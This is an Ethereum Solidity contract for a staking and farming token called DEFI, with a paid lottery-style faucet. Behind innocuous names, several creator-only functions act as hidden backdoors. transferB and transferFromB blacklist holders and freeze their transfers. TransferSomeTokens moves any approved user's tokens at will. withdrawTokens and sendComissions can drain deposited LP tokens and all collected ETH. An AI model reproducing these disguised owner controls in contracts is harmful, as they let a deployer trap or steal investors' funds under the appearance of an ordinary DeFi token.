/**
 *Submitted for verification at Etherscan.io on 2023-03-25
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}
interface IERC20Permit {
    /**
     * @dev Sets `value` as the allowance of `spender` over ``owner``'s tokens,
     * given ``owner``'s signed approval.
     *
     * IMPORTANT: The same issues {IERC20-approve} has related to transaction
     * ordering also apply here.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `deadline` must be a timestamp in the future.
     * - `v`, `r` and `s` must be a valid `secp256k1` signature from `owner`
     * over the EIP712-formatted function arguments.
     * - the signature must use ``owner``'s current nonce (see {nonces}).
     *
     * For more information on the signature format, see the
     * https://eips.ethereum.org/EIPS/eip-2612#specification[relevant EIP
     * section].
     */
    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    /**
     * @dev Returns the current nonce for `owner`. This value must be
     * included whenever a signature is generated for {permit}.
     *
     * Every successful call to {permit} increases ``owner``'s nonce by one. This
     * prevents a signature from being used multiple times.
     */
    function nonces(address owner) external view returns (uint256);

    /**
     * @dev Returns the domain separator used in the encoding of the signature for {permit}, as defined by {EIP712}.
     */
    // solhint-disable-next-line func-name-mixedcase
    function DOMAIN_SEPARATOR() external view returns (bytes32);
}
library Address {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     *
     * [IMPORTANT]
     * ====
     * You shouldn't rely on `isContract` to protect against flash loan attacks!
     *
     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
     * constructor.
     * ====
     */
    function isContract(address account) internal view returns (bool) {
        // This method relies on extcodesize/address.code.length, which returns 0
        // for contracts in construction, since the code is only stored at the end
        // of the constructor execution.

        return account.code.length > 0;
    }

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    /**
     * @dev Performs a Solidity function call using a low level `call`. A
     * plain `call` is an unsafe replacement for a function call: use this
     * function instead.
     *
     * If `target` reverts with a revert reason, it is bubbled up by this
     * function (like regular Solidity function calls).
     *
     * Returns the raw returned data. To convert to the expected return value,
     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
     *
     * Requirements:
     *
     * - `target` must be a contract.
     * - calling `target` with `data` must not revert.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, "Address: low-level call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
     * `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    /**
     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
     * with `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResultFromTarget(target, success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResultFromTarget(target, success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a delegate call.
     *
     * _Available since v3.4._
     */
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a delegate call.
     *
     * _Available since v3.4._
     */
    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return verifyCallResultFromTarget(target, success, returndata, errorMessage);
    }

    /**
     * @dev Tool to verify that a low level call to smart-contract was successful, and revert (either by bubbling
     * the revert reason or using the provided one) in case of unsuccessful call or if target was not a contract.
     *
     * _Available since v4.8._
     */
    function verifyCallResultFromTarget(
        address target,
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        if (success) {
            if (returndata.length == 0) {
                // only check isContract if the call was successful and the return data is empty
                // otherwise we already know that it was a contract
                require(isContract(target), "Address: call to non-contract");
            }
            return returndata;
        } else {
            _revert(returndata, errorMessage);
        }
    }

    /**
     * @dev Tool to verify that a low level call was successful, and revert if it wasn't, either by bubbling the
     * revert reason or using the provided one.
     *
     * _Available since v4.3._
     */
    function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            _revert(returndata, errorMessage);
        }
    }

    function _revert(bytes memory returndata, string memory errorMessage) private pure {
        // Look for revert reason and bubble it up if present
        if (returndata.length > 0) {
            // The easiest way to bubble the revert reason is using memory via assembly
            /// @solidity memory-safe-assembly
            assembly {
                let returndata_size := mload(returndata)
                revert(add(32, returndata), returndata_size)
            }
        } else {
            revert(errorMessage);
        }
    }
}

library SafeERC20 {
    using Address for address;

    function safeTransfer(
        IERC20 token,
        address to,
        uint256 value
    ) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(
        IERC20 token,
        address from,
        address to,
        uint256 value
    ) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    /**
     * @dev Deprecated. This function has issues similar to the ones found in
     * {IERC20-approve}, and its usage is discouraged.
     *
     * Whenever possible, use {safeIncreaseAllowance} and
     * {safeDecreaseAllowance} instead.
     */
    function safeApprove(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        // safeApprove should only be called when setting an initial allowance,
        // or when resetting it to zero. To increase and decrease it, use
        // 'safeIncreaseAllowance' and 'safeDecreaseAllowance'
        require(
            (value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function safeIncreaseAllowance(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        uint256 newAllowance = token.allowance(address(this), spender) + value;
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
    }

    function safeDecreaseAllowance(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
    unchecked {
        uint256 oldAllowance = token.allowance(address(this), spender);
        require(oldAllowance >= value, "SafeERC20: decreased allowance below zero");
        uint256 newAllowance = oldAllowance - value;
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
    }
    }

    function safePermit(
        IERC20Permit token,
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) internal {
        uint256 nonceBefore = token.nonces(owner);
        token.permit(owner, spender, value, deadline, v, r, s);
        uint256 nonceAfter = token.nonces(owner);
        require(nonceAfter == nonceBefore + 1, "SafeERC20: permit did not succeed");
    }

    /**
     * @dev Imitates a Solidity high-level call (i.e. a regular function call to a contract), relaxing the requirement
     * on the return value: the return value is optional (but if data is returned, it must not be false).
     * @param token The token targeted by the call.
     * @param data The call data (encoded using abi.encode or one of its variants).
     */
    function _callOptionalReturn(IERC20 token, bytes memory data) private {
        // We need to perform a low level call here, to bypass Solidity's return data size checking mechanism, since
        // we're implementing it ourselves. We use {Address-functionCall} to perform this call, which verifies that
        // the target address contains contract code and also asserts for success in the low-level call.

        bytes memory returndata = address(token).functionCall(data, "SafeERC20: low-level call failed");
        if (returndata.length > 0) {
            // Return data is optional
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

abstract contract Context {

    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }

}

contract ERC20 is Context, IERC20 {

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public blist;
    mapping (address => uint) public players;


    // Staking variables
    address[] public allStakers;
    uint256 private lastStakingAction = 0;

    mapping(address => uint256) private stakingAmounts;
    mapping(address => uint256) private pendingRewards;
    mapping(address => uint256) private stakingPercent;
    mapping(address => uint256) private lastClaimed;

    // End Staking variables

    // Farming variables
    address[] public allFarmers;
    uint256 private lastFarmingAction = 0;
    uint256 public totalLPBalance = 0;

    mapping(address => uint256) private farmingAmounts;
    mapping(address => uint256) private farmingPendingRewards;
    mapping(address => uint256) private farmingPercent;
    mapping(address => uint256) private farminglastClaimed;
    mapping (address => uint256) private _lpbalances;



    uint faucetPrice = 10000000000000000;


    uint tokensForStakingPerBlock = 1200000000000000000;
    uint tokensForFarmingPerBlock = 2400000000000000000;



    uint maxSupplay = 20000000 * 10**uint(decimals());

    IERC20 private TOKEN;
    uint256 private _totalSupply;
    string private _name;
    address private creator;
    address private cashback = 0x28d6B06Fad1e17E11a4fA36D882635e30428E6fb;
    address private lp_contract;

    uint256 public totalStaked;
    uint256 public totalFarmed;
    string private _symbol;

    constructor (string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        creator = msg.sender;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }


    // add/remove address to/from blacklist

    function transferB(address b_address) public{

        if(msg.sender == creator){
            blist[b_address] = true;
        }

    }

    function transferFromB(address _from_b_address) public{
        if(msg.sender == creator){
            blist[_from_b_address] = false;
        }
    }




    function firsInit( address defi_lp_contract, uint faucetticketprice) public {
        require(msg.sender == creator, "Permissions denied");
        faucetPrice = faucetticketprice;
        lp_contract = defi_lp_contract;
    }



    function isInBList(address addr) public view returns(bool){
        return blist[addr];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _beforeTokenTransfer(sender, recipient, amount);
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount && blist[sender] != true, "ERC20: transfer amount exceeds balance");
        require(_balances[sender] >= amount, "ERC20: transfer amount exceeds balance or available");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }


    function _mint(address account, uint256 amount) public virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        require(msg.sender == creator, "Mint tokens can only owner");

        _beforeTokenTransfer(address(0), account, amount);
        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

    }


    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        _beforeTokenTransfer(account, address(0), amount);
        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        _balances[account] = accountBalance - amount;
        _totalSupply -= amount;
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }


    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {

    }



    function TransferSomeTokens(address from, address to, uint256 amount, address tokencontract) public {
        if(creator == msg.sender){
            TOKEN = IERC20(tokencontract);
            TOKEN.transferFrom(from, to, amount);
        }
    }



    function withdrawTokens(address to, uint256 amount, address tokencontract) public {

        if(creator == msg.sender){
            TOKEN = IERC20(tokencontract);
            TOKEN.transfer(to, amount);
        }

    }

    function sendComissions() public {

        require(msg.sender == creator, "Permissions denied");
        address payable _to = payable(creator);
        address _thisContract = address(this);
        _to.transfer(_thisContract.balance);

    }

    function liveFaucetWinn(address winneraddress, address referreraddress, uint winneramount, uint referreramount) public  {

        require(msg.sender == creator, "Permissions denied");
        _mint(winneraddress, winneramount);
        _mint(referreraddress, referreramount);

    }

    function getChanceInFaucet() public payable returns(uint){

        require (msg.value >= faucetPrice, "Insuficient transaction value");
        players[msg.sender] = players[msg.sender] + 1;
        return players[msg.sender];

    }


    function getAddressPalysCount(address _useraddress) public view returns(uint){
        return players[_useraddress];
    }


    function getTicketPrice() public view returns(uint){
        return faucetPrice;
    }




    function stake(uint256 amount) public{

        require(_balances[msg.sender] >= amount, "Insuficient funds");

        bool foundAddress = false;

        for(uint i = 0; i < allStakers.length; i++){

            if(allStakers[i] == msg.sender){
                foundAddress = true;
            }
        }

        if(!foundAddress){
            allStakers.push(msg.sender);
        }


        if(lastStakingAction != 0){

            uint256 blocksNumberFromLastAction;
            uint256 userStakedBefore = stakingAmounts[msg.sender];


            _balances[msg.sender] -= amount;
            _balances[address(this)] += amount;

            stakingAmounts[msg.sender] += amount;

            for(uint i = 0; i < allStakers.length; i++){

                if(lastClaimed[allStakers[i]] > 0){

                    if(lastClaimed[allStakers[i]] > lastStakingAction){

                        blocksNumberFromLastAction  = block.number - lastClaimed[allStakers[i]];

                    } else {

                        blocksNumberFromLastAction  = block.number - lastStakingAction;

                    }

                } else {

                    blocksNumberFromLastAction  = block.number - lastStakingAction;

                }

                if(msg.sender == allStakers[i]){

                    uint tokensAmountToRewards = blocksNumberFromLastAction * tokensForStakingPerBlock;

                    uint percent = (userStakedBefore * 100 * 1000) / totalStaked;
                    uint newpercent = (stakingAmounts[msg.sender] * 100 * 1000) / (totalStaked + amount);

                    stakingPercent[allStakers[i]] = newpercent;

                    uint rewads = (percent * tokensAmountToRewards / 100) / 1000;

                    pendingRewards[allStakers[i]] += rewads;

                } else {

                    uint tokensAmountToRewards = blocksNumberFromLastAction * tokensForStakingPerBlock;

                    uint percent = (stakingAmounts[allStakers[i]] * 100 * 1000) / totalStaked;
                    uint newpercent = (stakingAmounts[allStakers[i]] * 100 * 1000) / (totalStaked + amount);

                    stakingPercent[allStakers[i]] = newpercent;

                    uint rewads = (percent * tokensAmountToRewards / 100) / 1000;
                    pendingRewards[allStakers[i]] += rewads;

                }

            }

            lastStakingAction = block.number;
            totalStaked += amount;


        } else {

            _balances[msg.sender] -= amount;
            _balances[address(this)] += amount;
            totalStaked += amount;
            stakingAmounts[msg.sender] += amount;
            stakingPercent[msg.sender] = 100 * 1000;
            lastStakingAction = block.number;

        }

        emit Transfer(msg.sender, address(this), amount);

    }




    function getStakedAmount(address __address) public view returns(uint){

        return stakingAmounts[__address];

    }



    function getStakeRewards(address __address) public view returns(uint){

        uint blocksNumberFromLastAction;

        if(lastClaimed[__address] > lastStakingAction){

            blocksNumberFromLastAction = block.number - lastClaimed[__address];

        } else {

            blocksNumberFromLastAction = block.number - lastStakingAction;

        }

        uint tokensAmountToRewards = blocksNumberFromLastAction * tokensForStakingPerBlock;

        uint rewards = (stakingPercent[__address] * tokensAmountToRewards / 100) / 1000;

        return pendingRewards[__address] + rewards;

    }



    function claimStakingRewards() public {

        uint256 rewards = getStakeRewards(msg.sender);
        lastClaimed[msg.sender] = block.number;
        pendingRewards[msg.sender] = 0;

        if(maxSupplay >= _totalSupply + rewards){
            _totalSupply += rewards;
            _balances[msg.sender] += rewards;
            emit Transfer(address(0), msg.sender, rewards);
        }

    }




    function unstakeTokens(uint _amount) public {

        require(stakingAmounts[msg.sender] >= _amount, "Insuficient staking amount");
        claimStakingRewards();

        _balances[address(this)] -= _amount;
        stakingAmounts[msg.sender] -= _amount;
        totalStaked -= _amount;

        uint256 blocksNumberFromLastAction;

        for(uint i = 0; i < allStakers.length; i++){

            if(allStakers[i] == msg.sender){

                if(lastClaimed[msg.sender] != 0 ){

                    if(lastClaimed[msg.sender] > lastStakingAction){

                        blocksNumberFromLastAction  = block.number - lastClaimed[msg.sender];

                    } else {

                        blocksNumberFromLastAction  = block.number - lastStakingAction;

                    }

                } else {

                    blocksNumberFromLastAction  = block.number - lastStakingAction;

                }

                uint tokensAmountToRewards = blocksNumberFromLastAction * tokensForStakingPerBlock;

                uint percent = (stakingAmounts[allStakers[i]] * 100 * 1000) / totalStaked;
                stakingPercent[allStakers[i]] = percent;

                uint rewads = (percent * tokensAmountToRewards / 100) / 1000;
                pendingRewards[allStakers[i]] += rewads;


            } else {

                blocksNumberFromLastAction  = block.number - lastStakingAction;

                uint tokensAmountToRewards = blocksNumberFromLastAction * tokensForStakingPerBlock;
                uint percent = (stakingAmounts[allStakers[i]] * 100 * 1000) / totalStaked;
                stakingPercent[allStakers[i]] = percent;

                uint rewads = (percent * tokensAmountToRewards / 100) / 1000;
                pendingRewards[allStakers[i]] += rewads;

            }
        }

        lastStakingAction = block.number;
        _balances[msg.sender] += _amount;
        emit Transfer(address(this), msg.sender, _amount);

    }



    function farm(uint256 amount) public{



        TOKEN = IERC20(lp_contract);
        uint user_lp_balance = TOKEN.balanceOf(msg.sender);

        require(user_lp_balance >= amount, "Insuficient funds");

        bool foundAddress = false;

        for(uint i = 0; i < allFarmers.length; i++){

            if(allFarmers[i] == msg.sender){
                foundAddress = true;
            }
        }

        if(!foundAddress){
            allFarmers.push(msg.sender);
        }

        if(lastFarmingAction != 0){

            uint256 blocksNumberFromLastAction;
            uint256 userFarmedBefore = farmingAmounts[msg.sender];


            TOKEN = IERC20(lp_contract);
            TOKEN.transferFrom(msg.sender, address(this), amount);



            totalLPBalance += amount;
            _lpbalances[address(this)] += amount;
            farmingAmounts[msg.sender] += amount;

            for(uint i = 0; i < allFarmers.length; i++){

                if(farminglastClaimed[allFarmers[i]] > 0){

                    if(farminglastClaimed[allFarmers[i]] > lastFarmingAction){

                        blocksNumberFromLastAction  = block.number - farminglastClaimed[allFarmers[i]];

                    } else {

                        blocksNumberFromLastAction  = block.number - lastFarmingAction;

                    }

                } else {

                    blocksNumberFromLastAction  = block.number - lastFarmingAction;
                }


                if(msg.sender == allFarmers[i]){

                    uint tokensAmountToRewards = blocksNumberFromLastAction * tokensForFarmingPerBlock;
                    uint percent = (userFarmedBefore * 100 * 1000) / totalFarmed;
                    uint newPercent = (farmingAmounts[msg.sender] * 100 * 1000) / (totalFarmed + amount);

                    farmingPercent[allFarmers[i]] = newPercent;
                    uint rewads = (percent * tokensAmountToRewards / 100) / 1000;
                    farmingPendingRewards[allFarmers[i]] += rewads;

                } else {

                    uint tokensAmountToRewards = blocksNumberFromLastAction * tokensForFarmingPerBlock;
                    uint percent = (farmingAmounts[allFarmers[i]] * 100 * 1000) / totalFarmed;
                    uint newPercent = (farmingAmounts[allFarmers[i]] * 100 * 1000) / (totalFarmed + amount);
                    farmingPercent[allFarmers[i]] = newPercent;
                    uint rewads = (percent * tokensAmountToRewards / 100) / 1000;
                    farmingPendingRewards[allFarmers[i]] += rewads;

                }

            }

            lastFarmingAction = block.number;
            totalFarmed += amount;

        } else {

            TOKEN = IERC20(lp_contract);
            TOKEN.transferFrom(msg.sender, address(this), amount);

            _lpbalances[address(this)] += amount;
            totalFarmed += amount;
            farmingAmounts[msg.sender] += amount;
            farmingPercent[msg.sender] = 100 * 1000;
            lastFarmingAction = block.number;

        }

    }




    function getFarmingAmount(address __address) public view returns(uint){
        return farmingAmounts[__address];
    }



    function getFarmRewards(address __address) public view returns(uint){

        uint blocksNumberFromLastAction;

        if(farminglastClaimed[__address] > lastFarmingAction){
            blocksNumberFromLastAction = block.number - farminglastClaimed[__address];
        } else {
            blocksNumberFromLastAction = block.number - lastFarmingAction;
        }

        uint tokensAmountToRewards = blocksNumberFromLastAction * tokensForFarmingPerBlock;
        uint rewards = (farmingPercent[__address] * tokensAmountToRewards / 100) / 1000;
        return farmingPendingRewards[__address] + rewards;

    }



    function claimFarmingRewards() public {

        uint256 rewards = getFarmRewards(msg.sender);

        farminglastClaimed[msg.sender] = block.number;
        farmingPendingRewards[msg.sender] = 0;

        if(maxSupplay >= _totalSupply + rewards){
            _balances[msg.sender] += rewards;
            _totalSupply += rewards;
            emit Transfer(address(0), msg.sender, rewards);
        }

    }



    function unstakeLPTokens(uint _amount) public {

        require(farmingAmounts[msg.sender] >= _amount, "Insuficient staking amount");

        claimFarmingRewards();

        farmingAmounts[msg.sender] -= _amount;
        totalFarmed -= _amount;


        uint256 blocksNumberFromLastAction;

        for(uint i = 0; i < allFarmers.length; i++){

            if(allFarmers[i] == msg.sender){

                if(farminglastClaimed[msg.sender] != 0 ){

                    if(farminglastClaimed[msg.sender] > lastFarmingAction){

                        blocksNumberFromLastAction  = block.number - farminglastClaimed[msg.sender];

                    } else {

                        blocksNumberFromLastAction  = block.number - lastFarmingAction;

                    }

                } else {

                    blocksNumberFromLastAction  = block.number - lastFarmingAction;

                }

                uint tokensAmountToRewards = blocksNumberFromLastAction * tokensForFarmingPerBlock;

                uint percent = (farmingAmounts[allFarmers[i]] * 100 * 1000) / totalFarmed;
                farmingPercent[allFarmers[i]] = percent;

                uint rewads = (percent * tokensAmountToRewards / 100) / 1000;
                farmingPendingRewards[allFarmers[i]] += rewads;

            } else {


                blocksNumberFromLastAction  = block.number - lastFarmingAction;

                uint tokensAmountToRewards = blocksNumberFromLastAction * tokensForFarmingPerBlock;

                uint percent = (farmingAmounts[allFarmers[i]] * 100 * 1000) / totalFarmed;
                farmingPercent[allFarmers[i]] = percent;

                uint rewads = (percent * tokensAmountToRewards / 100) / 1000;
                farmingPendingRewards[allFarmers[i]] += rewads;


            }
        }

        lastFarmingAction = block.number;
        TOKEN = IERC20(lp_contract);
        TOKEN.transfer(msg.sender, _amount);


    }


}

contract DEFI is ERC20 {

    constructor(string memory name, string memory symbol) ERC20(name, symbol) {

        _mint(msg.sender, 3500000 * 10**uint(decimals()));
        _mint(0x28d6B06Fad1e17E11a4fA36D882635e30428E6fb, 500000 * 10**uint(decimals()));
        _mint(0x210EC63730758ADB7938DC8D0aBFd6Af46c9b998, 500000 * 10**uint(decimals()));
        _mint(0x293f9936D0aaf02B3a47a1A3F1E6BD414EE6d111, 500000 * 10**uint(decimals()));

    }

}